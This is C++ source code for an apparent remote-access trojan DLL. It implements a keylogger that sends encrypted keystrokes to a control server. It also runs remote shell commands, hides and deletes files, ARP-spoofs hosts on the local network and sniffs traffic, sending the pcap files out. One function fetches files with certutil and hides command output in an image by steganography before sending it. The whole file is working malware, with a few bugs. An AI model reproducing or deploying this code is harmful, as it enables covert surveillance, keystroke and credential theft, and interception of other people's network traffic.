#define _CRT_SECURE_NO_WARNINGS
#include "Components.h"
#include "arpspoof.h"
#include "SniffTraffic.h"

#define EXPORTING_DLL

vector<SOCKET*> sockets;
vector<Arpspoof*> spoofvictims;
string kl;
bool storeKeys;
std::atomic<bool> sniffanddump;

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}


/*
split the command from the server by space
*/
vector<string> split(string str)
{
	istringstream iss(str);
	vector<string> tokens;
	copy(istream_iterator<string>(iss),
		istream_iterator<string>(),
		back_inserter(tokens));

	return tokens;
}

/*
EXECUTE the netstat command
*/
string RunNetstat(string cmd)
{
	return exec("netstat -n -a -o");
}

/*
get the names,type and permissions of files in a directory
*/
string GetAllFiles(string dir)
{
	if (dir.empty())
	{
		char path[128];
		GetCurrentDirectory(sizeof(path), path);
		dir = path;
	}
	string result = "";
	// Get recursive list of files in given directory and its sub directories
	vector<MyFileClass> listOfFiles = getAllFilesInDir(dir);

	for (vector<MyFileClass>::iterator it = listOfFiles.begin(); it != listOfFiles.end(); ++it)
	{
		result += it->getPath();
		result += '\t';
		result += it->getFileType((int)it->getStatus().type());
		result += '\t';
		result += it->getPermissions();
		result += '\n';
	}

	return result;
}

/*
call function to open a socket in a different  thread
*/
string OpenSocket(std::string ip_and_port)
{
	while (true)
	{
		thread t1(OpenSocketWithThread, ip_and_port);
		t1.detach();
	}
}
/*
start thread to spoof victim
*/
string SpoofVictim(std::string ip)
{
	thread t(&SpoofVictimInThread, ip);
	t.detach();
	return "Spoof started";
}

string SniffCurrentTraffic(std::string filter)
{
	thread t(&SniffTrafficWithThread, filter);
	t.detach();
	return "SniffTraffic started";
}

string StopSniffTraffic(string nothing)
{
	sniffanddump = false;
	return "sniffing stopped";
}

/*
start spoofing a victim ip.
create a spoofing object and add it to the spoofvictims vector
start spoofing in new thread
*/
void SpoofVictimInThread(std::string ip)
{
	Arpspoof a(ip);
	spoofvictims.push_back(&a);
	a.SendArpReplayForSpoofing(ip);
}

void SendFile(char * newFile)
{
	WSADATA wsadata;
	SOCKET s = NULL;

	int error = WSAStartup(MAKEWORD(2, 2), &wsadata);

	//Did something happen?
	if (error)
		return;

	//Did we get the right Winsock version?
	if (wsadata.wVersion != 0x0202)
	{
		WSACleanup(); //Clean up Winsock
		return;
	}

	//Fill out the information needed to initialize a socket…
	addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //Create socket
	if (s == INVALID_SOCKET)
	{
		return; //Couldn't create the socket
	}

	//Try connecting...
	addrinfo *target;
	error = getaddrinfo("127.0.0.1", "4921", &hints, &target);
	connect(s, target->ai_addr, (int)target->ai_addrlen);

	char remoteFILE[1024];
	ifstream file_to_send;
	file_to_send.open(newFile, std::ios::in | std::ios::binary);
	file_to_send.seekg(0, std::ios::end);
	long fileSIZE;
	fileSIZE = file_to_send.tellg();
	file_to_send.seekg(0, std::ios::beg);
	file_to_send.seekg(8);
	fileSIZE -= 8;
	char* bufferCMP;
	bufferCMP = (char*)malloc(sizeof(char) * fileSIZE);
	file_to_send.read(bufferCMP, fileSIZE);
	file_to_send.close();
	int chunkcount = fileSIZE / 1023;
	int lastchunksize = fileSIZE - (chunkcount * 1023);
	int fileoffset = 0;
	int iResult;

	//Sending Actual Chunks
	while (chunkcount > 0)
	{
		string message = string("7").append(bufferCMP + (fileoffset * 1023), 1023);
		iResult = send(s, message.c_str(), 1024, 0);
		fileoffset++;
		chunkcount--;

		if (iResult != 1024)
		{
			//printf("Sending Buffer size <> Default buffer length  ::: %d\n",WSAGetLastError());
		}
		else
		{
			//printf("Sending Buffer size = %d \n", iResult);
		}
		Sleep(100);
	}

	//Sending last Chunk
	string message = string("7").append(bufferCMP + (fileoffset * 1023), 1023);
	iResult = send(s, message.c_str(), 1024, 0);
	message = string("7finish");
	iResult = send(s, message.c_str(), message.size(), 0);
}

/*
stop spoofing a victim ip.
find a spoofing object in the spoofvictims vector
change the boolean in the object to stop the spoof
*/
bool StopSpoofingVictim(std::string ip)
{
	vector<Arpspoof*>::iterator it = std::find_if(spoofvictims.begin(), spoofvictims.end(), [&ip](Arpspoof *obj) {return obj->_ip == ip; });
	if (it != spoofvictims.end())
	{
		(*it)->stop = true;
	}
	return false;
}

/*
change file
*/
string ChangeFile(string cmd)
{
	vector<string> res = split(cmd);
	vector<string>::iterator it = res.begin();
	string file = *it;
	MessageBox(NULL, "sd", file.c_str(), 0);
	string typeofcommand = (*++it);
	if (!typeofcommand.compare("+h"))
	{
		return HideFileOrFolder(file);
	}
	if (!typeofcommand.compare("-h"))
	{
		return UnHideFileOrFolder(file);
	}
	if (!typeofcommand.compare("rm"))
	{
		return DeleteGivenFile(file);
	}
	if (!typeofcommand.compare("mv"))
	{
		return MoveGivenFileToDestination(string((*++it)), string((*it)));
	}
}

/*
returns arp table. interface, each ip and mac
*/
string GetArpTable()
{
	string cmd = "arp -a";
	string table = exec(cmd);
	vector<string> tokens = split(table);
	vector<string> arpinfo;
	for (vector<string>::iterator it = tokens.begin(); it != tokens.end(); ++it)
	{
		if (!(it->compare("Interface:")))
		{

			arpinfo.push_back(string((it++)->c_str()));
			arpinfo.push_back(string((it)->c_str()));
		}
		if (!(it->compare("dynamic")))
		{
			arpinfo.push_back(string((----it)->c_str()));
			arpinfo.push_back(string((++it)->c_str()));
			++it;
		}
	}
	string s;
	int i = 1;
	for (vector<string>::iterator it = arpinfo.begin(); it != arpinfo.end(); ++it, i++)
	{
		s.append(it->c_str()).append("\t");
		if (i % 2 == 0) {
			s.append("\n");
		}
	}
	return s;
}

string StartKeyLogger(string sharedKey)
{
	storeKeys = true;
	thread t1(KeyLogger);
	t1.detach();
	thread t2(SendKeyLoggerToServer, sharedKey);
	t2.detach();
	return "Key Logger Started";
}

string StopKeyLogger(string nothing)
{
	storeKeys = false;
	return "Key logger stoped";
}

string HideMessageInPicture(string fileName_and_cmd)
{
	vector<string> params = split(fileName_and_cmd);
	vector<string>::iterator it = params.begin();
	string fileName = *it;
	string cmd = *(++it);

	//SendPicture(fileName, cmd);

	thread t1(SendPicture, fileName, cmd);
	t1.detach();
	return "I will send you result via picture";
}


/*
change attribute to hidden in file or folder
*/
string HideFileOrFolder(string pathtofileorfolder)
{
	string cmd = "attrib +h \"";
	cmd.append(pathtofileorfolder).append("\"");
	return exec(cmd);
}

/*
turn hidden file to not hidden
*/
string UnHideFileOrFolder(string pathtofileorfolder)
{
	string cmd = "attrib -h \"";
	cmd.append(pathtofileorfolder).append("\"");
	return exec(cmd);
}

/*
delete file
*/
string DeleteGivenFile(string pathtodelete)
{
	string cmd = "del \"";
	cmd.append(pathtodelete).append("\"");
	return exec(cmd);
}

/*
move filepath to other directory path
*/
string MoveGivenFileToDestination(string pathtofile, string Destination)
{
	string cmd = "copy \"";
	cmd.append(pathtofile).append("\" \"").append(Destination).append("\"");
	return exec(cmd);
}

/*
open a socket in a different  thread and send data every minute
*/
string OpenSocketWithThread(std::string ip_and_port)
{

	SOCKET *s = NULL;
	try
	{
		// split the input to get ip and port
		vector<string> res = split(string(ip_and_port));
		vector<string>::iterator it = res.begin();
		bool success = false;
		for (size_t i = 0; i < 3 && !success; i++)
		{
			success = ConnectToHost(it->c_str(), (++it)->c_str(), s);
		}
		if (success)
		{
			MessageBox(NULL, "success", "success", 0);
			sockets.push_back(s);
		}
		while (success)
		{
			send(*s, "Hi", 2, 0);
			Sleep(60000);
		}
	}
	catch (...)
	{
		vector<SOCKET*>::iterator it = sockets.begin();
		SOCKET sf = std::find(sockets.begin(), sockets.end(), s) != sockets.end();
		if (it != sockets.end())
		{
			CloseConnection(sf);
		}
	}

	return string();
}
/*

	sniff traffic and send the generated pcap file to the server
	*/
std::string SniffTrafficWithThread(std::string filter)
{
	sniffanddump = true;
	while (sniffanddump)
	{
		SniffTraffic temp(filter.c_str(), 1000);
		temp.Capture();
		SendFile(temp.dumpfilename);
	}

}

/*
execute in cmd a command
Input: command
Output: stdout with returns from commands
*/
string exec(string cmd)
{
	char buffer[128];
	string result = "";
	FILE *pipe = _popen(cmd.c_str(), "r");
	try
	{
		while (!feof(pipe))
		{
			if (fgets(buffer, 128, pipe) != NULL)
			{
				result += buffer;
			}
		}
	}
	catch (...)
	{
		_pclose(pipe);
	}

	_pclose(pipe);
	return result;
}

/*
get permissions for each permissions in file
*/
string getFilePermissions(perms p)
{
	string result;
	result += ((p & perms::owner_read) != perms::none ? "r" : "-");
	result += ((p & perms::owner_write) != perms::none ? "w" : "-");
	result += ((p & perms::owner_exec) != perms::none ? "x" : "-");
	result += ((p & perms::group_read) != perms::none ? "r" : "-");
	result += ((p & perms::group_write) != perms::none ? "w" : "-");
	result += ((p & perms::group_exec) != perms::none ? "x" : "-");
	result += ((p & perms::others_read) != perms::none ? "r" : "-");
	result += ((p & perms::others_write) != perms::none ? "w" : "-");
	result += ((p & perms::others_exec) != perms::none ? "x" : "-");
	return result;
}

/*
the function gets the names and permissions of a file in a dir
checks if the path exists then iterates through the dir and gets all permissions
*/
vector<MyFileClass> getAllFilesInDir(const string &dirPath)
{
	vector<MyFileClass> listOfFiles;
	// Create a vector of string
	try {
		// Check if given path exists and points to a directory
		if (exists(dirPath) && is_directory(dirPath))
		{
			// Create a Directory Iterator object and points to the starting and to endof directory
			directory_iterator iter(dirPath), end;

			// Iterate till end
			while (iter != end)
			{
				// Add the name in vector
				listOfFiles.push_back(MyFileClass(iter->path().filename().string(), iter->status(),
					getFilePermissions(status(iter->path()).permissions())));

				error_code ec;
				// Increment the iterator to point to next entry in recursive iteration
				iter.increment(ec);
				if (ec) {
					cerr << "Error While Accessing : " << iter->path().string() << " :: " << ec.message() << '\n';
				}
			}
		}
	}
	catch (system_error & e)
	{
		cerr << "Exception :: " << e.what();
	}
	return listOfFiles;
}

/*
the func opens a socket from a given port to a ip and port
*/
bool ConnectToHost(const char * PortNo, const char * IPAddress, SOCKET* s)
{
	//Start up Winsock

	WSADATA wsadata;

	int error = WSAStartup(MAKEWORD(2, 2), &wsadata);

	//Did something happen?
	if (error)
		return false;

	//Did we get the right Winsock version?
	if (wsadata.wVersion != 0x0202)
	{
		WSACleanup(); //Clean up Winsock
		return false;
	}

	//Fill out the information needed to initialize a socket

	addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	*s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //Create socket
	if (*s == INVALID_SOCKET)
	{
		return false; //Couldn't create the socket
	}

	//Try connecting...
	addrinfo *target;
	error = getaddrinfo(IPAddress, PortNo, &hints, &target);
	if (connect(*s, target->ai_addr, (int)target->ai_addrlen) == SOCKET_ERROR)
	{
		return false; //Couldn't connect
	}
	else
	{
		sockets.push_back(s);
		return true; //Success
	}
}

/*
close socket
*/
void CloseConnection(SOCKET s)
{
	//Close the socket if it exists
	if (s)
		closesocket(s);

	WSACleanup(); //Clean up Winsock
}

bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		cout << " ";
		//LOG(" ");
		kl += ' ';
		return true;
	case VK_RETURN:
		cout << "\n";
		//LOG("\n");
		kl.append("\n");
		return true;
	case 'Â¾':
		cout << ".";
		//LOG(".");
		kl.append(".");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		//LOG("#SHIFT#");
		kl.append("#SHIFT#");
		return true;
	case VK_BACK:
		cout << "\b";
		//LOG("\b");
		kl.append("\b");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		//LOG("#R_CLICK#");
		kl.append("#R_CLICK#");
		return true;
	default:
		return false;
	}
}

void SendPicture(string fileName, string cmd)
{
	Sleep(1000);
	string newFile = EncodeTextInsideImg(fileName, cmd);

	WSADATA wsadata;
	SOCKET s = NULL;

	int error = WSAStartup(MAKEWORD(2, 2), &wsadata);

	//Did something happen?
	if (error)
		return;

	//Did we get the right Winsock version?
	if (wsadata.wVersion != 0x0202)
	{
		WSACleanup(); //Clean up Winsock
		return;
	}

	//Fill out the information needed to initialize a socket

	addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //Create socket
	if (s == INVALID_SOCKET)
	{
		return; //Couldn't create the socket
	}

	addrinfo *target;
	error = getaddrinfo("127.0.0.1", "4921", &hints, &target);
	connect(s, target->ai_addr, (int)target->ai_addrlen);

	char remoteFILE[1024];
	ifstream file_to_send;
	file_to_send.open(newFile, std::ios::in | std::ios::binary);
	file_to_send.seekg(0, std::ios::end);
	long fileSIZE;
	fileSIZE = file_to_send.tellg();
	file_to_send.seekg(0, std::ios::beg);
	file_to_send.seekg(8);
	fileSIZE -= 8;
	char* bufferCMP;
	bufferCMP = (char*)malloc(sizeof(char) * fileSIZE);
	file_to_send.read(bufferCMP, fileSIZE);
	file_to_send.close();
	int chunkcount = fileSIZE / 1023;
	int lastchunksize = fileSIZE - (chunkcount * 1023);
	int fileoffset = 0;
	int iResult;

	//Sending Actual Chunks
	while (chunkcount > 0)
	{
		string message = string("5").append(bufferCMP + (fileoffset * 1023), 1023);
		iResult = send(s, message.c_str(), 1024, 0);
		fileoffset++;
		chunkcount--;

		if (iResult != 1024)
		{
			//printf("Sending Buffer size <> Default buffer length  ::: %d\n",WSAGetLastError());
		}
		else
		{
			//printf("Sending Buffer size = %d \n", iResult);
		}
		Sleep(100);
	}

	//Sending last Chunk
	string message = string("5").append(bufferCMP + (fileoffset * 1023), 1023);
	iResult = send(s, message.c_str(), 1024, 0);
	message = string("5finish");
	iResult = send(s, message.c_str(), message.size(), 0);
}

string EncodeTextInsideImg(string fileName, string cmd)
{
	string downloadImg = string("certutil.exe -urlcache -f ").append(fileName).append(" 1.png");
	exec(downloadImg);
	string text = exec(cmd);
	Mat img, stego;
	int b = 0;
	int bits = text.length() * 8 + 7;

	char path_in[256];
	char path_out[256];
	GetCurrentDirectory(sizeof(path_in), path_in);
	GetCurrentDirectory(sizeof(path_out), path_out);
	strcat(path_in, "\\1.png");
	strcat(path_out, "\\2.png");

	img = imread(path_in, IMREAD_COLOR);

	img.copyTo(stego);

	for (int i = 0; i < img.rows; i++)
	{
		for (int j = 0; j < img.cols; j++)
		{
			uchar val = img.at<Vec3b>(i, j)[0];

			val &= 254;

			if (b < bits)
			{
				val |= (text[b / 8] & 1 << b % 8) >> b % 8;
			}
			else
			{
				val |= 0;
			}

			stego.at<Vec3b>(i, j)[0] = val;
			b++;
		}
	}

	imwrite(path_out, stego);

	return path_out;

}

void KeyLogger()
{
	char KEY = ' ';

	while (storeKeys) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {

					/*fstream LogFile;
					LogFile.open("dat.txt", fstream::app);
					if (LogFile.is_open()) {
					LogFile << char(KEY);
					LogFile.close();
					}*/
					kl += KEY;

				}
			}
		}
	}
}

void SendKeyLoggerToServer(string sharedKey)
{
	WSADATA wsadata;
	SOCKET s = NULL;
	AES_crypto aes(sharedKey);

	int error = WSAStartup(MAKEWORD(2, 2), &wsadata);

	//Did something happen?
	if (error)
		return;

	//Did we get the right Winsock version?
	if (wsadata.wVersion != 0x0202)
	{
		WSACleanup(); //Clean up Winsock
		return;
	}

	//Fill out the information needed to initialize a socket

	addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //Create socket
	if (s == INVALID_SOCKET)
	{
		return; //Couldn't create the socket
	}

	//Try connecting...
	addrinfo *target;
	error = getaddrinfo("127.0.0.1", "4921", &hints, &target);
	connect(s, target->ai_addr, (int)target->ai_addrlen);

	while (true)
	{
		Sleep(60000);
		string message = string("6").append(aes.Encrypt(kl));
		send(s, message.c_str(), message.size(), 0);
		cout << kl << endl;
		kl = "";
	}
}